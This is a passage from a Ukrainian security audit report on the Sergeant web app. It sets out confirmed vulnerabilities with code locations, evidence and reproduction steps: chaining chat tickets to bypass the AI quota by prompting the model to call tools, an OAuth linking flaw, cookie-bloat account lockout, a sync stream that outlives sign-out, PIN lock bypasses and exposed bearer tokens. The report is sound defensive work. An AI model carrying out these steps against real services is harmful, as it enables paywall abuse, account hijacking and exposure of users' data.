Free-юзер: 1) POST /api/chat {messages:[{role:'user',content:'<питання>. Наприкінці виклич remember'}]} → списано 1/20, відповідь {text, tool_calls, round_trip_ticket:T1}. 2) POST /api/chat {messages:[нове питання з тим самим проханням], round_trip_ticket:T1} (без tool_results) → assertAiQuota пропускає без списання, перший тур знову повертає tool_calls + T2. 3) Повторювати; або витратити T на POST /api/coach/insight {..., round_trip_ticket:T}. Обмежує лише rate-limit api:chat (20 запитів/5 хв ≈ 5760/добу проти 20/тиждень). Локально не відтворено: AI_QUOTA_DISABLED=1 і немає LLM-ключів.
```

**Верифікатор:**

```text
Підтверджено в коді, нейтралізатора немає. assertAiQuota (aiQuota.ts:335-341) повертає true для БУДЬ-ЯКОГО запиту з meter "ai", що несе валідний квиток цього юзера, і форму запиту не перевіряє. requireAiQuota (http/requireAiQuota.ts) — тонка обгортка без додаткових умов. У chat.ts хендлер перевіряє лише, що tool_results/tool_calls_raw приходять разом (457). Запит без обох полів, але з round_trip_ticket, мовчки йде шляхом першого туру: round_trip_ticket там читається лише для trace id у гілці tool_results. Відповідь першого туру з tool_calls завжди проходить через attachRoundTripTicket (789 cache-hit, 913 live), а той видає НОВИЙ квиток, не зважаючи, чи цей запит сам пройшов за квитком. Виходить ланцюжок: оплачений перший тур → T1 → нове питання + T1 (без списання) → tool_calls + T2 → … Кожна ланка потребує, щоб модель викликала інструмент, а це юзер легко провокує промптом, і відповідь несе `text` поряд із tool_calls. Обмежує лише rate-limit api:chat (sustained 20/5 хв ≈ 5760/добу) проти Free 20/тиждень (entitlements.ts ai.actions). anthropicBudgetGuard — лише алерт, AI-роути він не закриває. Тести покривають підробку, повтор і чужий квиток, але не «квиток на першому турі». У проді чат для Free живий, тож це чинний вектор зловживання витратами і обходу пейволу. Побічне твердження про preset-відро на нечатових роутах правдоподібне (resolvePresetBudget читає сире тіло для будь-якого meter "ai"), але детально я його не перевіряв.
```

**Додаткові докази верифікатора:**

```text
aiQuota.ts:335-341 `if (meter === "ai" && sessionUser && tryConsumeRoundTripTicket(req, sessionUser.id)) return true;`. chat.ts:340-360 attachRoundTripTicket перевіряє лише ledgerUserId і непорожній tool_calls; 896-913 перший тур з toolUses>0 → `.json(attachRoundTripTicket(body, ledgerUserId, chatTraceId))`. routes/chat.ts:61-73 ланцюг requireSession → rateLimit(api:chat, sustained 20/5хв) → requireChatUpstreamKey → requireAiQuota → chatHandler. obs/anthropicBudgetGuard.ts:43-45 «AI-роути лишаються відкритими — це alert, не circuit-breaker». Живого відтворення немає: локально AI_QUOTA_DISABLED=1 і немає LLM-ключів.
```

**Скептик:** не спростував, оцінка high.

```text
I tried to refute this and couldn't. I traced the code end to end and also reproduced the chain against the real code at HEAD c7c09607.

**Static trace**
- Route chain (apps/server/src/routes/chat.ts:20-73): requireSession → rateLimitExpress(api:chat, burst 60/min cost 10, sustained 20/5min) → requireChatUpstreamKey → requireAiQuota() → chatHandler. requireAiQuota (http/requireAiQuota.ts) is a thin wrapper with no extra conditions.
- assertAiQuota (modules/chat/aiQuota.ts:335-341) returns true and skips all charging and DB calls when the raw body has a round_trip_ticket that is valid for this user. tryConsumeRoundTripTicket (aiQuota.ts:302-307) checks only that the ticket is a non-empty string and then calls consumeRoundTripTicket. It never checks that the request is actually a continuation (tool_results plus tool_calls_raw).
- consumeRoundTripTicket (chatRoundTripTicket.ts:102-117) checks only that the ticket exists, is not expired and belongs to the user.
- In chat.ts, the handler's only shape guard is the XOR check at 457. A body with neither tool_results nor tool_calls_raw goes down the first-turn path (from 719).
- In the first-turn path, round_trip_ticket is only used as a trace id inside the tool_results branch (528).
- Every first-turn response with tool_calls goes through attachRoundTripTicket: cache hit at 787-789, live call at 896-913. attachRoundTripTicket (340-360) gates only on ledgerUserId and a non-empty tool_calls, so it mints a new ticket whether or not this request was itself paid with a ticket.
- This contradicts the stated design intent. The canon (docs/product/modules/hub-coach.md:567-573, 816) says the ticket only frees the second HTTP request of the same turn, and that faking "I am a continuation" without a real first turn is impossible.

**Dynamic proof**
- Script: <scratch>/agents/skeptic-server-static-webhooks-billing-quota-2/chain.test.ts, run with vitest using the real chat.ts and aiQuota.ts. Only the Anthropic transport, getSessionUser and getUserPlan(free) were mocked, and AI_QUOTA_DISABLED was unset.
- One normal first turn issued T1. Then 5 brand-new questions were each sent as a plain first turn carrying the previous ticket. For each one:
  - assertAiQuota returned true with zero getUserPlan calls (no charge path).
  - The handler made a real upstream LLM call.
  - The response contained the text answer and a fresh, different ticket.
- Result: 6 upstream calls with only the first one charged. The control case (no ticket) did hit the plan lookup and charge path. Both tests passed.

**What I could not use to refute it**
- In-memory store: prod runs a single instance, so tickets are found.
- TTL of 2 minutes: the next request arrives within seconds.
- Need for a tool call: the attacker writes the prompt and can simply ask for one. The `text` field is returned alongside tool_calls.
- anthropicBudgetGuard (obs/anthropicBudgetGuard.ts:39-45): it only alerts (soft $3, hard $5 per day). It explicitly keeps /api/chat open, and ANTHROPIC_BUDGET_HARD_DEGRADE_ALL is off by default.
- The only real bound is the per-user rate limit, about 4 requests per minute sustained (roughly 5,760 per day), against a Free allowance of 20 per week (packages/shared/src/billing/entitlements.ts:35-40). That is about 2,000x the weekly quota per account. Against a $5/day hard alert threshold, even one account can exceed the owner's budget.

**Overstated parts (they don't lower the core severity)**
- Spending a ticket on coach or nutrition routes is not an amplifier. Tickets are conserved: each request consumes one and only chat first turns mint one. A coach call therefore ends the chain and needs a newly paid quota unit to restart. The same applies to finishing a full tool turn (the synthesis turn mints no ticket).
- The preset-bucket side note (aiQuotaBudget.ts:148-156 reads `preset` from the raw body for any meter "ai" route) is plausible but separate and minor.

**Why high and not critical**
- No data breach. It needs a scripted client and the model's cooperation. Cost is bounded per account by the rate limit and surfaced by Sentry alerts.
- It is still a working, in-prod bypass of the Free paywall and quota, with real money cost that scales with the number of free accounts.

**Fix direction**
- In assertAiQuota, only honour the ticket when the body carries both tool_results and tool_calls_raw.
- In chat.ts, reject or ignore round_trip_ticket on first-turn requests.
```

## medium

### [medium] Silpo OAuth: state не прив'язаний до браузера, тож посилання атакера прив'язує Silpo-акаунт ЖЕРТВИ до Sergeant-акаунта АТАКЕРА

- **ID:** `api-live/ai-billing-integrations-live#6` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Живе API
- **Стан:** відкрито
- **Де:** apps/server/src/routes/silpo.ts:103-123 (connectHandler: 302 на authorize URL зі state атакера), :135-225 (callbackHandler без сесії; власник визначається лише за state), коментар :191-196
- **Вплив:** Атакер отримує історію покупок жертви в Сільпо (чеки) і може змінювати її кошик (cart/apply, cart/clear), тобто читати й писати у сторонньому акаунті. Сторінка згоди справжня (домен Silpo, справжній клієнт Sergeant), тому фішинг правдоподібний. Ризик з'являється, щойно інтеграцію ввімкнуть.
- **Що зробити:** Прив'язати state до браузера, що почав flow: на /connect ставити HttpOnly SameSite=Lax cookie з nonce на домені callback-а (API) і звіряти її в callback, або зробити callback на домені веб-застосунку з активною сесією і перевіркою `req.user.id === pending.userId`. Після прив'язки показувати користувачу, який Silpo-акаунт підключено, з можливістю відключити.

**Докази:**

```text
Статично (локально SILPO_ENABLED вимкнено: GET /api/silpo/callback -> 503 SILPO_DISABLED, /api/silpo/* -> 503). Код: `const pending = await consumeAuthorizationState(state); ... const userId = pending.userId; ... await persistTokens(userId, ring, {...})`. Коментар сам описує сценарій і вважає його нешкідливим: «Підсунутий чужий state привʼяже токени до акаунта того, хто цей state замовив, — тобто до самого зловмисника». Саме це і є атака: GET /api/silpo/connect від атакера повертає 302 Location на сторінку згоди Silpo з його state (TTL 10 хв); атакер надсилає це посилання жертві; жертва логіниться в Silpo і погоджується; callback зберігає токени жертви на userId атакера.
```

**Відтворення:**

```text
1) Атакер (сесія A) робить GET /api/silpo/connect без follow redirect і копіює Location. 2) Жертва відкриває URL, логіниться в Silpo, тисне «Дозволити». 3) Callback -> persistTokens(userId=A). 4) Атакер: POST /api/silpo/sync, GET /api/silpo/receipts, POST /api/silpo/cart/apply від свого акаунта. Потрібно SILPO_ENABLED=true.
```

**Верифікатор:**

```text
Підтверджено в коді, живий прогін неможливий: SILPO_ENABLED локально і в проді вимкнено. GET /api/silpo/connect (під requireSession) робить 302 на authorize-URL зі state, прив'язаним до userId ініціатора. callbackHandler (routes/silpo.ts:135-225) працює без сесії й без cookie: власника визначає лише consumeAuthorizationState(state).userId, після чого persistTokens(userId=ініціатор). Ні cookie-nonce, ні іншої прив'язки state до браузера немає. Коментар :191-196 і рішення в spec silpo-mcp-integration.md:606 («Куку свідомо не брали») розглядають лише класичний CSRF, коли атакер підсовує свій code. Зворотний сценарій вони пропускають: атакер віддає жертві свій authorize-URL (свіжий можна генерувати на льоту, тож TTL 10 хв не заважає), жертва погоджується на справжній сторінці Сільпо для справжнього клієнта Sergeant, і токени її акаунта лягають на userId атакера. Далі атакер має доступ до /api/silpo/receipts, sync і cart/apply|clear. Те, що вирішення задокументоване, саме є небезпечним наміром. Severity medium: потрібна соціальна інженерія і ввімкнення фічі, а ввімкнення заплановане (env-vars.md:729).
```

**Додаткові докази верифікатора:**

```text
routes/silpo.ts:582-598: callback зареєстровано ДО `r.use("/api/silpo", requireSession())`; connect — GET + 302. :191-196: «Підсунутий чужий state привʼяже токени до акаунта того, хто цей state замовив, — тобто до самого зловмисника». cart.ts експортує applyCart/clearCart.
```

### [medium] Задовге name через /api/auth/update-user роздуває session-cookie кеш до ~28KB -&gt; браузер юзера блокується (431)

- **ID:** `api-live/input-fuzz#3` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Живе API
- **Стан:** відкрито
- **Де:** apps/server/src/auth.ts:427-431 (session.cookieCache maxAge 300s, без ліміту довжини name); sanitizeUserImage фільтрує лише image; web ставить max(80) у apps/web/src/core/profile/PersonalInfoSection.tsx:27, сервер — ні
- **Вплив:** Поле name не має серверного ліміту й не проходить ту саму санітизацію, що image (sanitizeUserImage існує саме через інцидент з 19KB-аватаркою). Один update-user із довгим name роздуває JWT-cookie-кеш у 8 chunk-ів, після чого власний браузер акаунта впирається в ліміт заголовків (431) і застосунок не вантажиться ~5 хв. Вектор self-DoS/грифінгу для будь-кого з валідною сесією.
- **Що зробити:** Додати серверний ліміт довжини name (дзеркалити web-ліміт 80, напр. у databaseHooks.user.*.before поряд із sanitizeUserImage) і відкидати не-рядкові типи замість JSON-коерції.

**Докази:**

```text
Свіжий юзер fuzz3. POST /api/auth/update-user {name:'N'x20480} -> 200. Після цього Better Auth пише user у cookie-cache: cookies стали session_data.0..7 по ~3977B + session_token 83B; сукупний Cookie-заголовок 28635 байт. Браузерні fetch усі 'Failed to fetch'; сирий node GET /api/me з тими куками -> 431; page.goto('http://127.0.0.1:4173/') -> net::ERR_HTTP_RESPONSE_CODE_FAILURE. Сервер приймає будь-який тип name: 12345->'12345', {a:1}->'{"a":1}', [x,y]->'{"x","y"}', 300 символів — усі 200.
```

**Відтворення:**

```text
node .../agents/api-live-input-fuzz/r1_longname.mjs (20KB name через браузерний fetch -> наступні fetch 'Failed to fetch', сирий GET /api/me = 431); node .../r1_updateuser.mjs (тип-коерція name). Самовідновлення ~5 хв (cookieCache maxAge 300s).
```

**Верифікатор:**

```text
Відтворено на окремому одноразовому користувачі (vif2-name, звичайний node http). POST /api/auth/update-user {name:'N'×20480} дає 200 і 10 Set-Cookie: session_data.0..7 по 4049 B. Сукупний Cookie-заголовок 28635 B, після чого GET /api/me дає 431 (дефолтний Node maxHeaderSize 16KB; у коді й Dockerfile maxHeaderSize ніде не змінюється). Твердження фіндера про самовідновлення за ~5 хв НЕВІРНЕ, ситуація гірша. Я імітував закінчення cookie-кешу, лишивши тільки session_token (109 B). Перший же GET /api/auth/get-session дає 200 і знову ставить 8 Set-Cookie на 28870 B, а наступний /api/me знову 431. Блокування постійне: воно переживає закінчення кешу, ре-логін і відкликання сесій, бо будь-яка нова сесія кешує той самий роздутий user. Виправити імʼя з UI неможливо, застосунок не вантажиться. Лімітів у коді немає: databaseHooks.user.update.before (auth.ts:525-538) викликає лише sanitizeUserImage, а він існує саме через інцидент 2026-05-02 з тим самим механізмом для image. name також приймає 12345, {a:1}, [x,y], true, на все 200. Medium лишаю: спрацювати може лише власник акаунта або той, хто має його сесію (CSRF не проходить, бо потрібен XRW і CORS). Але викрадена сесія дає примітив постійного DoS акаунта, який переживає скидання пароля й відкликання сесій.
```

**Додаткові докази верифікатора:**

```text
r2/v3_name.mjs: 'after: GET /api/me 431'; 'token-only get-session: 200 set-cookie count 8 total sc bytes 28870'; 'token-only, after re-set: GET /api/me 431'. Після тесту імʼя відновлено (cleanup 200). Веб обмежує імʼя (max 80) лише на клієнті.
```

### [medium] SSE /api/v2/sync/stream далі віддає дані після виходу/відкликання сесії, без обмеження часу

- **ID:** `api-live/sync-live#2` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Живе API
- **Стан:** відкрито
- **Серйозність від шукача:** high (переоцінено верифікатором)
- **Де:** apps/server/src/modules/sync/syncV2Stream.ts:230-412 (сесія перевіряється лише на handshake; opLogEmitter.on(channel) рядок 348; heartbeat тримає з'єднання вічно); apps/server/src/routes/sync.ts (requireSession() лише на вході)
- **Вплив:** Хто колись отримав сесію (вкрадена кука, чужий пристрій), зберігає живий потік УСІХ нових синк-записів жертви (фінанси, харчування, тренування, розшифровані нотатки травм через decryptOpRowForPull) після виходу, «вийти з усіх пристроїв» чи зміни пароля, доки тримає TCP-з'єднання. Відкликання сесії для цього каналу не діє.
- **Що зробити:** Періодично перевіряти сесію в stream (наприклад, у heartbeat через getFreshSessionUser, кожні 25 с) і закривати з'єднання, якщо сесія недійсна. Задати максимальний строк життя з'єднання (наприклад, 15 хв, потім клієнт перепідключається з новим handshake). Слухати подію відкликання сесії/видалення акаунта і закривати канали user:&lt;id&gt;. Обмежити кількість одночасних stream на користувача.

**Докази:**

```text
POST /api/auth/sign-in/email (synclive2) → 200, сесія S3
GET /api/v2/sync/stream?since=999999 (cookie S3) → 200 text/event-stream
POST /api/auth/sign-out (cookie S3) → 200 {"success":true}
GET /api/v2/sync/pull (S3 token+session_data) одразу → 200 (5-хв cookieCache)
…через 330 с: GET /api/v2/sync/pull (S3) → 401
POST /api/v2/sync/push (інша, легітимна сесія) routine_entries {name:"written 5.5 min after the stream's session was revoked"}
У відкритому stream S3 (20:50:06): `id: 2311 event: op data: {"id":2311,"table":"routine_entries",…"name":"written 5.5 min after the stream's session was revoked"…}`
Коротший прогін t09: /api/me з токеном після sign-out → 401, а stream отримав наступний op одразу.
```

**Відтворення:**

```text
node …/agents/api-live-sync-live/t09_stream.mjs (миттєво) і t10_stream_long.mjs (≈6 хв): sign-in → відкрити stream → sign-out → дочекатися закінчення cookieCache → push з іншої сесії → кадр op приходить у відкликаний stream.
```

**Верифікатор:**

```text
Відтворено на власному юзері (vsyncc2). Кроки: sign-in, відкрити GET /api/v2/sync/stream, sign-out (200). Одразу після цього /api/me і pull лише з session_token дають 401, тобто сесію в БД відкликано. Проте push з іншої сесії миттєво дійшов у відкритий stream. Через 330 с (cookieCache 5 хв вичерпано) pull навіть з повним набором кук дає 401, а новий op знову доїхав у стрім (id 11584). У коді syncV2Stream.ts:207-412 сесію перевіряє лише requireSession() на handshake (routes/sync.ts:80). Далі живуть opLogEmitter.on(user:<id>) і heartbeat без жодної повторної перевірки та без стелі тривалості. requestTimeout свідомо пропускає text/event-stream (http/timeout.ts). API доступний напряму, без Vercel-проксі. Severity знижено з high до medium. Передумова: атакер уже має валідну сесію (крадіжка куки) і відкрив стрім до відкликання або протягом 5-хв вікна cookieCache. Доступ обривається на рестарті чи деплої сервера (автодеплой на кожен merge у main) або при розриві TCP. Клієнтського споживача стріму поки немає (backend.md:339), але атакеру він і не потрібен. Найважливіше, що «вийти»/відкликання сесії не закриває цей канал.
```

**Додаткові докази верифікатора:**

```text
<scratch>/agents/verify-api-live-sync-live/c3/w2_stream.out: 01:43:55 sign-out 200; /api/me token-only → 401; pull token-only → 401; 'stream got immediate op: true'; 01:49:26 pull with full revoked cookie set → 401; 01:49:27 'stream after wait: RECEIVED | id: 11584 … "name":"late after revoke"'.
```

### [medium] Коли сесія спливає посеред роботи, нічого не повідомляється і немає шляху повторного входу: записи тихо стають у чергу, а наступна навігація виглядає як втрата даних

- **ID:** `browser-crosscut/resilience-offline-perf#4` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Браузер · наскрізне
- **Стан:** відкрито
- **Де:** apps/web/src/core/auth/AuthContext.tsx:318-401; apps/web/src/core/app/SyncStatusSheet.tsx:175-179. URL: /finyk/transactions -&gt; /?tab=profile -&gt; /
- **Вплив:** Після revoke сесії (вихід на всіх пристроях, закінчення TTL) користувач далі вводить дані, які не синхронізуються, і не знає про це. Після reload модулі порожні, а профіль мовчки відкидає на хаб без пояснення «сесія завершилась». Схоже на втрату даних, люди можуть вводити все наново.
- **Що зробити:** Коли writer бачить відсутню сесію (get-session null чи 401), показувати постійний банер «Сесія завершилась: увійди, щоб синхронізувати N записів» із CTA на /sign-in?next=&lt;поточний маршрут&gt;. Для відомого раніше юзера на 401 показувати явний екран повторного входу, а не анонімний хаб. Deep-link у профіль редіректити на sign-in з next.

**Докази:**

```text
run-expiry.log: після ctx.clearCookies() і додавання EXPIRED-TX: 'visible true banner Синхронізація · 1 в черзі'; за 25 с лише '200 GET /api/auth/get-session', жодного push і жодного prompt. Аркуш: 'Помилки Немає'. '/?tab=profile' -> 'url /' (401 /api/v1/me); /finyk/transactions після reload: 'Операцій ще немає'. Після ручного входу дані повернулись, 'server has EXPIRED-TX-44116 true' (втрати немає). run-relogin.log: profile -> '/' і ще примусовий 'NAV /' на 22.2 с (identity-wipe). Скріни: expiry-1-after-submit.png, expiry-2-profile.png, expiry-3-finyk-anon.png
```

**Відтворення:**

```text
node 09-expiry.mjs: відкрити форму витрати, ctx.clearCookies(), надіслати, чекати 25 с, перейти на /?tab=profile, потім /finyk/transactions, потім /sign-in.
```

**Верифікатор:**

```text
The core claim holds, but one part of the title is overstated. In code: resolveUserId (singleton.ts:490-493) returns null when get-session has no user, and drain then returns [] with no signal to the UI. The /me query is not refetched in-tab (refetchOnWindowFocus false, staleTime 60 s, no observers besides AuthContext), so the tab keeps acting as logged in while ops queue silently. After a reload, /me returns 401 and the identity wipe drops to anonymous mode. Nothing in apps/web says the session ended: a SESSION_EXPIRED copy string exists in mapApiErrorToUserCopy but nothing on this path uses it. The title's 'немає шляху повторного входу' is wrong: the anonymous hub's bottom nav has a person icon labelled 'Увійти', so the user can sign in again. There is just no explanation. The most common trigger is a user returning after more than 7 days idle (auth.ts expiresIn 7 d, updateAge 1 d), who opens an empty hub with no 'сесія завершилась' message. Data is not lost: it returns after signing in. The root cause overlaps with #1 (identity wipe to anonymous mode), but this is the legitimate-401 variant.
```

**Додаткові докази верифікатора:**

```text
Independent repro with v4-expiry.mjs: clearCookies, then a cold reload. Log: '17.9 401 GET /api/v1/me' -> '18.2 NAV /finyk/transactions' (wipe reload) -> 'Операцій ще немає…'. Hub text: 'Sergeant Доброго ранку … Модулів увімкнено: 4 з 4 … Увійти Увійти', where 'Увійти' is only the nav icon label. has 'сесі': false. Screenshot: v4-hub.png.
```

### [medium] Контактні адреси для приватності, безпеки й юридичних запитів на домені sergeant.app із Null MX, а security.txt веде на старий репозиторій

- **ID:** `browser-surfaces/public-auth-pages#2` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Браузер · поверхні
- **Стан:** відкрито
- **Де:** apps/web/src/core/legal/legalShared.ts:15-18 (legal@/privacy@/support@/security@sergeant.app), /legal/privacy, /legal/terms, /legal/offer, /legal/cookies; apps/web/public/.well-known/security.txt:1
- **Вплив:** Запити суб'єктів даних (GDPR / ЗУ «Про захист ПД»), повідомлення про вразливості й претензії фізично не доходять. Обіцяний 30-денний строк відповіді та responsible disclosure не виконуються. Якщо домен sergeant.app належить третій стороні, вона може налаштувати MX і отримувати чутливі листи.
- **Що зробити:** Перевести всі контакти на домен, яким проєкт реально володіє і де налаштовано MX (sergeant.com.ua), або налаштувати пошту на sergeant.app, якщо він ваш. Оновити security.txt на SkOrDs-02/sergeant (або на mailto робочої скриньки) і додати перевірку доставки в launch-чекліст.

**Докази:**

```text
DNS із сандбокса (27-dns.mjs): `sergeant.app resolveMx [{"exchange":"","priority":0}]`, тобто RFC 7505 Null MX: домен прямо відмовляється приймати пошту. A-записи 76.223.54.146 / 13.248.169.48 схожі на паркінг. Усі продуктові URL живуть на sergeant.com.ua (sitemap, CSP, robots). У юридичних текстах: «звертайся на privacy@sergeant.app», «пиши на security@sergeant.app», «legal@sergeant.app». security.txt: `Contact: https://github.com/Skords-01/Sergeant/security/advisories/new`, а за AGENTS.md § «Де живе код» це старий репозиторій (актуальний SkOrDs-02/sergeant).
```

**Відтворення:**

```text
Відкрий /legal/privacy і знайди контакти. Перевір MX: `node 27-dns.mjs` у <scratch>/agents/browser-surfaces-public-auth-pages/. Відкрий /.well-known/security.txt.
```

**Верифікатор:**

```text
DNS перевірив сам (v27-dns.mjs). У sergeant.app MX = [{exchange:"",priority:0}], тобто RFC 7505 Null MX, а TXT = "v=spf1 -all". NS при цьому ns1/ns2.afternic.com (маркетплейс доменів GoDaddy, SOA hostmaster dns.jomax.net). Отже домен запаркований на продаж і пошти не приймає. Це сильніше за початковий доказ: домен майже напевно не під контролем проєкту, і покупець може підняти MX та отримувати запити суб'єктів даних і звіти про вразливості. legalShared.ts:15-18 справді вказує legal@/privacy@/support@/security@sergeant.app. security.txt:1 веде на github.com/Skords-01/Sergeant, а за AGENTS.md § «Де живе код» це старе репо (актуальне SkOrDs-02/sergeant, remote origin). Сам стан старого репо з сесії перевірити не вдалося (gh 403). Пом'якшувальна обставина: юридичні тексти ще містять плейсхолдери «буде внесено перед public launch». Але застосунок уже публічно розгорнутий, тож severity medium лишаю. Рекомендацію треба поправити: у sergeant.com.ua MX теж немає (ENODATA), тож просто змінити домен в адресах недостатньо, потрібно налаштувати пошту.
```

**Додаткові докази верифікатора:**

```text
v27-dns.mjs: `sergeant.app resolveNs ["ns1.afternic.com","ns2.afternic.com"]`, `resolveTxt [["v=spf1 -all"]]`, `resolveMx [{"exchange":"","priority":0}]`; `sergeant.com.ua resolveMx ERR ENODATA`. docs/work/specs/launch/business/04-launch-readiness.md:55 позначає «privacy@sergeant.app вказано» як частково виконане й не бачить, що пошта не доставляється. docs/start/instructions/operational-continuity.md:64 вважає sergeant.app своїм доменом («Check sergeant.app domain registrar»).
```

### [medium] 10 неправильних PIN підряд знімають блокування й пускають у застосунок

- **ID:** `client-static/web-storage-session#2` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** high (переоцінено верифікатором)
- **Де:** apps/web/src/core/security/lockStorage.ts:209-216; apps/web/src/core/security/useAppLock.ts:168-176; apps/web/src/shared/i18n/uk.privacy.ts:40
- **Вплив:** Будь-хто з фізичним доступом до пристрою за ~30 секунд обходить PIN і бачить фінанси, звички, харчування й чат. Захист від онлайн-перебору («Decision #4») на ділі перетворився на кнопку обходу.
- **Що зробити:** Після N невдач не розблоковувати: або виходити з акаунта з повним локальним стиранням (як iOS «стерти дані»), або вимагати пароль акаунта / повторний вхід. Додати наростаючу затримку між спробами. Скидання PIN робити лише після повторної автентифікації.

**Докази:**

```text
Браузер (lock3.mjs): `attempt 1..9: locked=true`, `attempt 10: locked=false`, URL `/?tab=profile`, дані на екрані. Код: на 10-й невдачі `deleteCred(key)` і `{ ok:false, wiped:true }`, далі `if (result.wiped) setState("idle")`, тобто замок просто зникає. Іншого шляху «Забув PIN» немає: `recoveryHint` відсилає до відновлення акаунта, яке PIN не скидає.
```

**Відтворення:**

```text
Увімкнути блокування, натиснути «Заблокувати зараз», 10 разів ввести 9999 і «Відкрити»: на 10-й спробі оверлей зникає, застосунок розблоковано.
```

**Верифікатор:**

```text
Відтворено (vwss-lock2): спроби 1..9 дають `locked=true`, на 10-й `locked=false`, діалогів немає, URL `/?tab=profile`, тумблер після цього `false`. Код (lockStorage.ts:209-216 → useAppLock.ts:168-176) навмисно знімає замок після стирання креденшела. Це «Decision #4», описане в коментарях, тож поведінка задумана. Але задум сам по собі небезпечний: коментар каже, що стирання захищає від онлайн-зловмисника з фізичним доступом, а насправді воно саме дає такому зловмиснику вхід за ~10 спроб. Тому знахідка лишається. Severity знижено до medium: блокування суто локальне, дані на пристрої й так незашифровані. До того ж через #1 той самий доступ і так дає простий reload, тож самостійна вага цього обходу менша.
```

**Додаткові докази верифікатора:**

```text
<scratch>/agents/verify-client-static-web-storage-session/v2-lock-bypass.mjs: `attempt 9: locked=true`, `attempt 10: locked=false`, `final dialogs: []`. Скрін shots/verify-client-static-web-storage-session/v2-after-bruteforce.png. Суміжне, але інше питання вже є в docs/work/specs/audits/2026-08-08-profile-settings-deep-audit.md L-11 (після 10 невдач тумблер лишається ON). Сам обхід там не розглядається.
```

### [medium] Блокування обходиться клавіатурою: Ctrl/Cmd+K відкриває глобальний пошук поверх замка з даними й діями

- **ID:** `client-static/web-storage-session#6` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/src/core/hooks/useHubKeyboardShortcuts.ts:57-67,124-150; apps/web/src/core/app/RootLayout.tsx:196-225; apps/web/src/core/hub/search/HubSearch.tsx:65; apps/web/src/core/security/AppLock.tsx:311-314,327
- **Вплив:** На десктопі та iPad з клавіатурою замок не захищає ні від перегляду (пошук по фінансах, звичках, їжі, тренуваннях), ні від запису нових даних чи запиту до AI від імені власника.
- **Що зробити:** Поки `state === "locked"`, не рендерити дерево застосунку (або хоча б не монтувати Outlet, оверлеї й пошук) і глобально вимикати готкеї. Перевіряти lock-стан у `useHubKeyboardShortcuts` і в діалогах, що відкриваються через подієву шину.

**Докази:**

```text
Браузер (lock4.mjs), стан «Введи PIN»: клік по кнопці «7» прибирає фокус із прихованого PIN-поля, після чого Ctrl+K і пошук «Таємна». У DOM два діалоги, `app-lock-title` і «Глобальний пошук», а `elementFromPoint` -> «Таємна терапія Zeta daily». Скрін shots/client-static-web-storage-session/lock4-search-while-locked.png: панель пошуку `fixed inset-0 z-200` повністю перекриває замок, видно звички користувача, «Запитати Сержанта», дії «Додати витрату / прийом їжі». `?` і Ctrl+/ також відкривають діалоги. Хендлер готкеїв не перевіряє стан замка: його блокує лише `isEditableTarget`. AppShell рендерить `{children}` за будь-якого стану замка, тож дані лежать у DOM під оверлеєм `bg-bg/95 backdrop-blur-md`.
```

**Відтворення:**

```text
Увімкнути блокування -> «Заблокувати зараз» -> клікнути цифру на панелі -> Ctrl+K -> ввести назву своєї звички чи транзакції.
```

**Верифікатор:**

```text
Відтворено (vwss-lock2/vwss-lock3). Поки фокус у прихованому PIN-полі, Ctrl+K нічого не відкриває (`isEditableTarget`). Після кліку по цифрі на панелі фокус переходить на BUTTON, і Ctrl+K відкриває «Глобальний пошук» поверх замка: обидва діалоги не inert, `elementFromPoint` влучає в панель пошуку. Запити «Верифікаційна»/«Omega» повертають звичку користувача «Верифікаційна Omega звичка», запит «звичк» — дії «Додати звичку» та інші. Скрін v2-search-while-locked.png підтверджує, що пошук повністю перекриває замок. За кодом `useHubKeyboardShortcuts` не перевіряє стан замка, а AppShell рендерить `{children}` за будь-якого стану. `inertBackground` у AppLock портальний пошук не зупиняє. Medium доречний: потрібна клавіатура і клік по панелі, хоча через #1 замок і так знімається reload-ом.
```

**Додаткові докази верифікатора:**

```text
<scratch>/agents/verify-client-static-web-storage-session/v2b.mjs: `Q Верифікаційна => ... Рутина Верифікаційна Omega звичка daily ...`, `Ctrl+K without clicking numpad -> dialogs: ["app-lock-title"]` (без кліку обхід не спрацьовує). Скріни shots/verify-client-static-web-storage-session/v2-search-while-locked.png і скрін автора lock4-search-while-locked.png (звичка «Таємна терапія Zeta» видна поверх замка).
```

### [medium] Сирі session token віддаються в JSON GET /api/auth/get-session і /api/auth/list-sessions (з токенами всіх пристроїв) і приймаються як Bearer

- **ID:** `server-static-redo/route-authz#2` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера · повтор route-authz
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md
- **Де:** apps/server/src/auth.ts:617 (plugins: [bearer(), expo()]); маршрути Better Auth /api/auth/get-session, /api/auth/list-sessions через routes/auth.ts:33
- **Вплив:** Будь-який XSS на дозволеному origin або помилка CORS (див. знахідку про 2dmanager) перетворюється з атаки в межах сесії браузера на крадіжку довготривалих токенів, включно з сесіями інших пристроїв. Такими токенами можна користуватися з будь-якого місця, поки сесії не відкличуть. HttpOnly-кука втрачає сенс.
- **Що зробити:** Вирізати поле token з відповідей get-session і list-sessions для cookie-клієнтів (хук after або customSession у Better Auth). Видавати bearer лише через заголовок set-auth-token при sign-in. Розглянути bearer({ requireSignature: true }) або вимкнути bearer, поки мобільний контур на паузі.

**Докази:**

```text
get-session: ключі session = expiresAt,token,createdAt,updatedAt,ipAddress,userAgent,userId,id. list-sessions: array[1] з полем token. Bearer <token> без куки → GET /api/me 200 (probe2.out, probe3.out). Мобільний контур на паузі (ADR-0094), але bearer-канал увімкнено для всіх.
```

**Відтворення:**

```text
Залогінений GET /api/auth/list-sessions, потім GET /api/me з Authorization: Bearer <token> без cookie (probe3.mjs).
```

**Верифікатор:**

```text
